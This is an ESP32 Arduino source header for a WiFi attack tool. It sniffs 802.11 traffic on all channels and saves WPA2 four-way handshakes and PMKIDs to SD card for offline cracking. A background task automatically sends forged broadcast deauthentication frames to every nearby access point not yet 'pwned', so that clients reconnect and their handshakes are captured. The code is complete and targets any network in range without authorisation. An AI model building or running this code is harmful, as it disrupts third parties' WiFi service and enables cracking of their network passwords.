#include <WiFi.h>
#pragma once
#include <Arduino.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include "config.h"
#include "sd_pcap.h"

// ================================================================
//  WiFi promiscuous capture engine
//
//  Passively sniffs all 802.11 frames on every channel.
//  Detects:
//    - Beacon frames    → builds AP list (SSID, BSSID, RSSI, channel)
//    - EAPOL frames     → WPA2 4-way handshake packets → save to pcap
//    - PMKID frames     → clientless WPA2 attack → save to pcap
//    - Deauth frames    → count + flash LED
//    - Probe requests   → count stations seen
//
//  Channel hops every CHANNEL_HOP_INTERVAL_MS automatically.
//  All captures saved to SD: /handshakes/<BSSID>_<SSID>.pcap
// ================================================================

// ── AP record ─────────────────────────────────────────────────────
struct ApRecord {
  uint8_t  bssid[6];
  char     ssid[33];
  int8_t   rssi;
  uint8_t  channel;
  uint32_t lastSeen;   // millis()
  uint16_t eapolCount;
  bool     hasHandshake;
  bool     hasPmkid;
};

// ── Globals ───────────────────────────────────────────────────────
static ApRecord  _aps[MAX_APS];
static uint8_t   _apCount      = 0;
static uint32_t  _totalPackets = 0;
static uint32_t  _eapolTotal   = 0;
static uint32_t  _pmkidTotal   = 0;
static uint32_t  _deauthTotal  = 0;
static uint32_t  _beaconTotal  = 0;
static uint8_t   _currentChan  = 1;
static uint32_t  _lastHop      = 0;
static bool      _capturing    = true;

// ── 802.11 frame header structs ───────────────────────────────────
typedef struct {
  uint8_t  frame_ctrl[2];
  uint16_t duration;
  uint8_t  addr1[6];   // destination
  uint8_t  addr2[6];   // source
  uint8_t  addr3[6];   // BSSID
  uint16_t seq_ctrl;
} __attribute__((packed)) wifi_ieee80211_mac_hdr_t;

typedef struct {
  wifi_ieee80211_mac_hdr_t hdr;
  uint8_t payload[0];
} __attribute__((packed)) wifi_ieee80211_packet_t;

// ── Frame type constants ──────────────────────────────────────────
#define FRAME_TYPE_MGMT   0x00
#define FRAME_TYPE_DATA   0x02
#define FRAME_SUBTYPE_BEACON   0x08
#define FRAME_SUBTYPE_DEAUTH   0x0C
#define FRAME_SUBTYPE_PROBE_REQ 0x04
#define FRAME_SUBTYPE_ASSOC_REQ 0x00
#define LLC_SNAP_EAPOL    0x888E

// ── BSSID helpers ─────────────────────────────────────────────────
static void bssidToStr(const uint8_t* b, char* out) {
  snprintf(out, 18, "%02X:%02X:%02X:%02X:%02X:%02X",
    b[0],b[1],b[2],b[3],b[4],b[5]);
}

static bool bssidEqual(const uint8_t* a, const uint8_t* b) {
  return memcmp(a, b, 6) == 0;
}

// ── Find or create AP record ──────────────────────────────────────
static ApRecord* findOrAddAp(const uint8_t* bssid) {
  for (uint8_t i = 0; i < _apCount; i++)
    if (bssidEqual(_aps[i].bssid, bssid)) return &_aps[i];
  if (_apCount >= MAX_APS) {
    // Evict oldest AP that has NOT been pwned — never evict captured ones
    uint32_t oldest = UINT32_MAX;
    int8_t   oldestIdx = -1;
    for (uint8_t i = 0; i < _apCount; i++) {
      if (_aps[i].hasHandshake || _aps[i].hasPmkid) continue;  // keep pwned
      if (_aps[i].lastSeen < oldest) { oldest = _aps[i].lastSeen; oldestIdx = i; }
    }
    if (oldestIdx < 0) oldestIdx = 0;  // all pwned — evict slot 0 as last resort
    ApRecord* ap = &_aps[oldestIdx];
    memset(ap, 0, sizeof(ApRecord));   // clear old data including hasHandshake
    memcpy(ap->bssid, bssid, 6);      // assign new BSSID immediately
    return ap;
  }
  ApRecord* ap = &_aps[_apCount++];
  memset(ap, 0, sizeof(ApRecord));
  memcpy(ap->bssid, bssid, 6);
  return ap;
}

// ── Parse beacon frame ────────────────────────────────────────────
static void parseBeacon(const uint8_t* payload, uint16_t len, ApRecord* ap) {
  if (len < 12) return;
  const uint8_t* ie = payload + 12;
  const uint8_t* end = payload + len;
  while (ie + 2 <= end) {
    uint8_t id  = ie[0];
    uint8_t iel = ie[1];
    if (ie + 2 + iel > end) break;
    if (id == 0) {
      uint8_t ssidLen = min(iel, (uint8_t)32);
      memcpy(ap->ssid, ie + 2, ssidLen);
      ap->ssid[ssidLen] = '\0';
      for (uint8_t i = 0; i < ssidLen; i++)
        if (ap->ssid[i] < 32 || ap->ssid[i] > 126) ap->ssid[i] = '_';
    }
    if (id == 3 && iel >= 1) {
      uint8_t ch = ie[2];
      if (ch >= 1 && ch <= 13) ap->channel = ch;  // 2.4GHz only
    }
    ie += 2 + iel;
  }
}

// ── Check for EAPOL (WPA handshake) ──────────────────────────────
// Robust scanner — handles QoS, 4-addr, and scans a window for the
// EAPOL ethertype 0x888E in case of minor header size variation.
static bool isEapol(const uint8_t* data, uint16_t len) {
  if (len < 28) return false;
  uint8_t fc0 = data[0];
  uint8_t fc1 = data[1];
  uint8_t ftype   = (fc0 >> 2) & 0x03;
  if (ftype != FRAME_TYPE_DATA) return false;

  uint8_t subtype = (fc0 >> 4) & 0x0F;
  if (subtype & 0x04) return false;  // null/CF subtypes carry no payload

  bool toDS   = (fc1 & 0x01) != 0;
  bool fromDS = (fc1 & 0x02) != 0;
  uint8_t hdrLen = 24;
  if (subtype & 0x08) hdrLen += 2;   // QoS adds 2 bytes
  if (toDS && fromDS) hdrLen += 6;   // 4-address frame

  if (len < (uint16_t)(hdrLen + 8)) return false;

  // Scan a small window after the MAC header for EAPOL signatures
  for (uint8_t off = 0; off <= 6; off++) {
    uint16_t pos = hdrLen + off;
    if (pos + 8 > len) break;
    const uint8_t* p = data + pos;
    // LLC/SNAP: AA AA 03 00 00 00 88 8E
    if (p[0]==0xAA && p[1]==0xAA && p[2]==0x03 &&
        p[3]==0x00 && p[4]==0x00 && p[5]==0x00 &&
        p[6]==0x88 && p[7]==0x8E) return true;
    // Raw ethertype without LLC (some drivers omit LLC)
    if (p[0]==0x88 && p[1]==0x8E) return true;
  }
  return false;
}

// ── Check for PMKID in RSN IE ────────────────────────────────────
static bool hasPmkid(const uint8_t* payload, uint16_t len) {
  // PMKID is in the RSN IE (id=48) of Association Request frames
  const uint8_t* ie = payload;
  const uint8_t* end = payload + len;
  while (ie + 2 <= end) {
    uint8_t id = ie[0], iel = ie[1];
    if (ie + 2 + iel > end) break;
    if (id == 48 && iel >= 20) {  // RSN Information Element
      // RSN IE structure: version(2) + group(4) + pairwise count(2) +
      // pairwise list(count*4) + AKM count(2) + AKM list + RSN cap(2) +
      // PMKID count(2) + PMKID list(count*16)
      // Simplification: search for PMKID count field > 0
      const uint8_t* rsn = ie + 2;
      if (iel < 4) { ie += 2 + iel; continue; }
      uint16_t pairwiseCount = rsn[2] | (rsn[3] << 8);
      uint16_t offset = 4 + pairwiseCount * 4;
      if (offset + 4 > iel) { ie += 2 + iel; continue; }
      uint16_t akmCount = rsn[offset] | (rsn[offset+1] << 8);
      offset += 2 + akmCount * 4 + 2;  // skip AKM list + RSN capabilities
      if (offset + 2 > iel) { ie += 2 + iel; continue; }
      uint16_t pmkidCount = rsn[offset] | (rsn[offset+1] << 8);
      if (pmkidCount > 0) return true;
    }
    ie += 2 + iel;
  }
  return false;
}

// ── Promiscuous callback ──────────────────────────────────────────
static void IRAM_ATTR wifiSnifferCb(void* buf, wifi_promiscuous_pkt_type_t type) {
  if (!_capturing) return;
  // Only process management and data frames — skip control (ACK/RTS/CTS)
  if (type == WIFI_PKT_CTRL) { _totalPackets++; return; }
  if (type != WIFI_PKT_MGMT && type != WIFI_PKT_DATA && type != WIFI_PKT_MISC) return;

  const wifi_promiscuous_pkt_t* pkt =
    (const wifi_promiscuous_pkt_t*)buf;
  const uint8_t* data = pkt->payload;
  uint16_t len = pkt->rx_ctrl.sig_len;
  if (len < 10) return;

  _totalPackets++;
  if (_totalPackets % 200 == 0) {
    static uint32_t _dataFrames = 0;
    if (type == WIFI_PKT_DATA) _dataFrames++;
    Serial.printf("[CAP] pkts=%lu aps=%d eapol=%lu data=%lu ch=%d\n",
      _totalPackets, _apCount, _eapolTotal, _dataFrames, _currentChan);
  }

  uint8_t fc0     = data[0];
  uint8_t fc1     = data[1];
  uint8_t ftype   = (fc0 >> 2) & 0x03;
  uint8_t fsubtype= (fc0 >> 4) & 0x0F;

  // ── Management frames ─────────────────────────────────────────
  if (ftype == FRAME_TYPE_MGMT) {
    const wifi_ieee80211_mac_hdr_t* hdr = (wifi_ieee80211_mac_hdr_t*)data;

    if (fsubtype == FRAME_SUBTYPE_BEACON && len > 36) {
      _beaconTotal++;
      ApRecord* ap = findOrAddAp(hdr->addr3);
      ap->rssi     = pkt->rx_ctrl.rssi;
      ap->lastSeen = millis();
      if (ap->channel == 0) ap->channel = _currentChan;
      if (ap->ssid[0] == '\0')
        parseBeacon(data + 36, len - 36, ap);
      return;
    }

    if (fsubtype == FRAME_SUBTYPE_DEAUTH) {
      _deauthTotal++;
      return;
    }

    // Association request — check for PMKID
    if (fsubtype == FRAME_SUBTYPE_ASSOC_REQ && len > 28) {
      ApRecord* ap = findOrAddAp(hdr->addr1);  // addr1 = AP (destination)
      if (hasPmkid(data + 28, len - 28)) {
        _pmkidTotal++;
        ap->hasPmkid = true;
        ap->lastSeen = millis();
        char bssidStr[18]; bssidToStr(ap->bssid, bssidStr);
        sdSaveHandshake(bssidStr, ap->ssid[0]?ap->ssid:"hidden",
                        data, len);
        Serial.printf("[CAP] PMKID: %s (%s)\n", ap->ssid, bssidStr);
      }
      return;
    }
  }

  // ── Data frames — check for EAPOL ────────────────────────────
  if (ftype == FRAME_TYPE_DATA && isEapol(data, len)) {
    _eapolTotal++;
    const wifi_ieee80211_mac_hdr_t* hdr = (wifi_ieee80211_mac_hdr_t*)data;
    // BSSID is addr3 for STA->AP and AP->STA frames
    ApRecord* ap = findOrAddAp(hdr->addr3);
    ap->eapolCount++;
    ap->lastSeen = millis();
    // Only mark pwned when MIC bit is set (EAPOL msg 2/3/4) — msg1 alone is useless
    // Find 88 8E ethertype, then check key_info byte for MIC bit (0x0100)
    if (!ap->hasHandshake) {
      const uint8_t* ep = data;
      const uint8_t* ep_end = data + len;
      while (ep + 2 < ep_end) {
        if (ep[0] == 0x88 && ep[1] == 0x8E) { ep += 2; break; }
        ep++;
      }
      // 802.1X: ver(1) type(1) len(2) → skip 4; then descriptor(1) key_info(2)
      if (ep + 7 <= ep_end && ep[1] == 0x03) {
        uint16_t keyInfo = ((uint16_t)ep[5] << 8) | ep[6];
        if (keyInfo & 0x0100) ap->hasHandshake = true;  // MIC set → msg 2/3/4
      }
    }
    char bssidStr[18]; bssidToStr(ap->bssid, bssidStr);
    sdSaveHandshake(bssidStr, ap->ssid[0]?ap->ssid:"hidden",
                    data, len);
    Serial.printf("[CAP] EAPOL #%lu: %s (%s) len=%d\n",
      _eapolTotal, ap->ssid[0]?ap->ssid:"hidden", bssidStr, len);
    // Hex dump first EAPOL for debugging
    if (_eapolTotal <= 2) {
      Serial.print("[CAP] EAPOL hex: ");
      for (uint8_t i=0; i<min((uint16_t)48,len); i++)
        Serial.printf("%02X ", data[i]);
      Serial.println();
    }
  }
}

// ── Deauth injection — runs on Core 0, never blocks main loop ────
// Main loop runs on Core 1. Deauth task runs on Core 0.
// Uses a queue so main loop just posts a target and returns instantly.

static QueueHandle_t _deauthQueue  = nullptr;
static SemaphoreHandle_t _wifiMux   = nullptr;  // guards esp_wifi_set_channel

struct DeauthTarget {
  uint8_t bssid[6];
  uint8_t channel;
};

// FreeRTOS task — runs on Core 0
static void deauthTask(void* param) {
  DeauthTarget t;
  while (true) {
    // Use timeout instead of portMAX_DELAY — lets watchdog get fed
    if (xQueueReceive(_deauthQueue, &t, pdMS_TO_TICKS(500)) == pdTRUE) {
      uint8_t frame[26] = {
        0xC0, 0x00, 0x00, 0x00,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,
        0x00, 0x00,
        0x01, 0x00
      };
      memcpy(frame+10, t.bssid, 6);
      memcpy(frame+16, t.bssid, 6);

      if (xSemaphoreTake(_wifiMux, pdMS_TO_TICKS(100)) == pdTRUE) {
        esp_wifi_set_channel(t.channel, WIFI_SECOND_CHAN_NONE);
        vTaskDelay(pdMS_TO_TICKS(2));
        for (uint8_t i = 0; i < 3; i++) {
          esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
          vTaskDelay(pdMS_TO_TICKS(3));
        }
        xSemaphoreGive(_wifiMux);
      }

      char bstr[18]; bssidToStr(t.bssid, bstr);
      Serial.printf("[DEAUTH] -> %s ch%d\n", bstr, t.channel);
    }
  }
}

static uint8_t  _deauthApIdx = 0;
static uint32_t _lastDeauth  = 0;
#define DEAUTH_INTERVAL_MS  2000

void deauthTick() {
  if (_apCount == 0 || _deauthQueue == nullptr) return;
  uint32_t now = millis();
  if (now - _lastDeauth < DEAUTH_INTERVAL_MS) return;
  _lastDeauth = now;

  // Find next uncracked 2.4GHz AP
  for (uint8_t tried = 0; tried < _apCount; tried++) {
    _deauthApIdx = (_deauthApIdx + 1) % _apCount;
    ApRecord* ap = &_aps[_deauthApIdx];
    if (!ap->hasHandshake && !ap->hasPmkid &&
        ap->channel >= 1 && ap->channel <= 13 &&
        (millis() - ap->lastSeen) < 30000) {
      DeauthTarget t;
      memcpy(t.bssid, ap->bssid, 6);
      t.channel = ap->channel;
      // Non-blocking post — if queue full, skip this cycle
      xQueueSend(_deauthQueue, &t, 0);
      return;
    }
  }
}

// ── Channel hop ───────────────────────────────────────────────────
// ── Channel hop ───────────────────────────────────────────────────
void captureChannelTick() {
  uint32_t now = millis();
  if (now - _lastHop >= CHANNEL_HOP_INTERVAL_MS) {
    _lastHop = now;
    // Don't hop if deauth task is busy
    if (_deauthQueue && uxQueueMessagesWaiting(_deauthQueue) > 0) return;
    _currentChan++;
    if (_currentChan > CHANNEL_MAX) _currentChan = CHANNEL_MIN;
    if (_wifiMux && xSemaphoreTake(_wifiMux, 0) == pdTRUE) {
      esp_wifi_set_channel(_currentChan, WIFI_SECOND_CHAN_NONE);
      xSemaphoreGive(_wifiMux);
    }
  }
}

// ── Init ──────────────────────────────────────────────────────────
void captureInit() {
  // Must init through Arduino WiFi layer first so nvs/phy are ready
  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  // Now switch to promiscuous via esp-idf API
  esp_wifi_set_promiscuous(false);  // ensure clean state
  esp_wifi_set_promiscuous_rx_cb(wifiSnifferCb);

  // Capture ALL frame types — management + data + misc
  wifi_promiscuous_filter_t filt;
  filt.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_filter(&filt);

  // Also capture control frames (ACK, RTS, CTS) — helps count traffic
  wifi_promiscuous_filter_t ctrl_filt;
  ctrl_filt.filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL;
  esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filt);

  esp_wifi_set_promiscuous(true);
  esp_wifi_set_channel(_currentChan, WIFI_SECOND_CHAN_NONE);

  // Mutex protects esp_wifi_set_channel from being called by both cores
  _wifiMux = xSemaphoreCreateMutex();

  // Start deauth task on Core 0 (main loop runs on Core 1)
  _deauthQueue = xQueueCreate(4, sizeof(DeauthTarget));
  xTaskCreatePinnedToCore(deauthTask, "deauth", 4096, nullptr, 1,
                          nullptr, 0);

  Serial.println("[CAP] Promiscuous mode active — radio is listening");
  Serial.printf("[CAP] Starting on channel %d\n", _currentChan);
}

// ── Accessors for UI ──────────────────────────────────────────────
inline uint8_t   captureApCount()     { return _apCount; }
inline uint32_t  captureEapol()       { return _eapolTotal; }
inline uint32_t  capturePmkid()       { return _pmkidTotal; }
inline uint32_t  captureDeauth()      { return _deauthTotal; }
inline uint32_t  capturePackets()     { return _totalPackets; }
inline uint8_t   captureChannel()     { return _currentChan; }
inline ApRecord* captureAps()         { return _aps; }

// Total unique networks with captured handshake or PMKID
inline uint16_t  capturePwned() {
  uint16_t n = 0;
  for (uint8_t i = 0; i < _apCount; i++)
    if (_aps[i].hasHandshake || _aps[i].hasPmkid) n++;
  return n;
}

// Best (strongest) AP seen
inline ApRecord* captureBestAp() {
  if (_apCount == 0) return nullptr;
  uint8_t best = 0;
  for (uint8_t i = 1; i < _apCount; i++)
    if (_aps[i].rssi > _aps[best].rssi) best = i;
  return &_aps[best];
}
